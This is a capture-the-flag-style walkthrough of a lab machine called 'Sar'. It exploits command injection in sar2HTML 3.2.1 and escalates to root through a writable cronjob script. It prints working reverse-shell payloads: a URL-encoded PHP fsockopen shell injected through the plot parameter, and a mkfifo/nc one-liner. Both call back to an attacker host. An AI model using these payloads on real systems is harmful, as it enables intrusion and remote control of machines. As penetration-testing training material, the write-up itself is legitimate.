Sar

Target IP: 192.168.170.35

Scanning





Looks like only two TCP ports are open on the host machine: HTTP and SSH. I will start my enumeration with HTTP.

Enumeration

Port 80: HTTP

From the nikto scan above, the page phpinfo.php provides a lot of information about the target machine; for example, it is using Linux sar 5.0.0-23-generic #24~18.04.1-Ubuntu SMP and it has PHP installed.



Doing a basic directory search highlights there is a robots.txt entry. Browsing to this page shows there is a entry called sar2HTML -- could this be another directory?


And bingo! It seems be running sar2html version 3.2.1.


Doing a Google search shows this application version is vulnerable to RCE. I found a verified public working exploit for this application.


According to this exploit, we can use the plot parameter used by the application to perform command execution; for example, as shown in the image above, we can send the payload ?plot=;id;whoami;ls to chain our commands which gets outputted under Select Host. Instead of using a working exploit, let's exploit this vulnerability manually; we can use PHP as the reverse shell.

Exploitation


I URL-encoded the payload, started a listener on port 8443, and sent it to the target machine. After doing this, I got a reverse shell connection! Now I have a foothold on the machine. I have listed below which payload I used, and the full URL to activate the exploit.
PHP reverse shell used: php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.211%22%2C8443%29%3Bshell_exec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
Full URL payload: http://192.168.170.35/sar2HTML/index.php?plot=;php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.211%22%2C8443%29%3Bshell_exec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27

Privilege Escalation


Upgrading to an interactive Python shell.


Looks like there is a cronjob that gets run as root.


There are two parts to the script. finally.sh calls write.sh. We have write privileges over write.sh, so we can put our reverse shell script here to gain a root shell.


The reverse shell script I used is rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.211 8444 >/tmp/f. I put the reverse shell script inside write.sh and changed permission to be executable. Then I waited until I received a root shell on port 8444.


And I received my root reverse shell connection.
